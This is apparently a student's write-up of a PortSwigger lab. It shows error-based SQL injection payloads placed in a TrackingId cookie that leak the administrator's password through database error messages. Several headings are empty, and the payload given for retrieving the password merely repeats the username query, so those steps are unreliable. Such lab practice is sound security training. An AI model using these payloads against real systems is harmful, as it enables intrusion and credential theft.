# Write-up: Visible error-based SQL injection   
![Homepage](img/01-homepage.png)  
Lab-link: https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based  
Difficulty: Practitioner   
Status: Solved  

## Lab description  
![Lab description](img/02-lab-description.png) 

## Objectives 
Retrieve the password of `administrator` user and log into their account  

## Background  
### Blind SQL injection   
Blind SQL injection occurs when an application is vulnerable to SQL injection, but the results of the injected query are not directly displayed in the response. Instead, information must be inferred from differences in the application's behavior.   
In this lab, an SQL error is intentionally triggered when error messages appeared in the response. These error messages would reveal the information of the `administrator` account.

### Comment in the query    

### `SELECT` subqueries  
A subquery is a SQL query nested inside another query.  
In this lab, subqueries are used to check information from the `users` table:  
```sql
SELECT 'x' FROM users WHERE username='administrator'
```
The result can then be used in a Boolean condition:  
```sql
(SELECT 'x' FROM users WHERE username='administrator')='x'
```

### `CAST`   

### `AS int`

### Why use LIMIT 1?  
`LIMIT 1` restricts the subquery to a single row:  
```sql
SELECT 'x' FROM users LIMIT 1
```
For this attack, we only need to know whether at least one row exists, so returning multiple rows is unnecessary.

## Steps   
### 1. Establish a baseline  
Firstly, I chose the **Pets** category
In Burp Suite, I intercepted this request and sent it to Repeater  
![Request](img/03-request.png)   
The important parameter in this lab is the `TrackingId` cookie    

### 2. Confirm the parameter is vulnerable to blind SQL injection   
I injected `'` index after the value of trackingId    
For example: `TrackingId=s2sgfBtGyudmIR8I'`  
In the response, I saw the message containing the whole query and the value of TrackingId. 

### 3. Comment the rest of the query  
I added `--` to the query and it became `TrackingId=s2sgfBtGyudmIR8I'--`. The response returned `200 OK` confirming that the query was syntactically valid.   

### 4. 
I injected:  
```text
' AND 1=CAST((SELECT 1) AS int)--
```
The reponse resulted in `200 OK`. This indicated that the query was in right syntax.  

### 5. Confirm that `users` table and `administrator` user exist  
I injected: 
```text
' AND 1=CAST((SELECT username FROM users) AS int)--
```
I got the warning: `Unterminated string literal started at position 95 in SQL SELECT * FROM tracking WHERE id = 's2sgfBtGyudmIR8I' AND 1=CAST((SELECT username FROM users) AS'. Expected  char`. This might show that the query might have the number of restricting characters.  
Now, I deleted the value of the TrackingId and I get the error message: `ERROR: more than one row returned by a subquery used as an expression`. Therefore, I used `LIMIT 1` to limit the number of rows to 1.  
The query was:   
```text
' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
```
And the response returned:
[Error message for administrator](img/04-administrator).   
This indicated that the `users` table and `administrator` user exist  

### 6. Retrieve the administrator password  
I used the following payload to reveal the password of administrator: 
```text
' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
```
The error message showed the password:
![Password](img/05-password)
The administrator password was: `wqjmueks9n19r8wgvtqh`
And the lab was solved:   
![Lab solved](img/06-lab-solved)
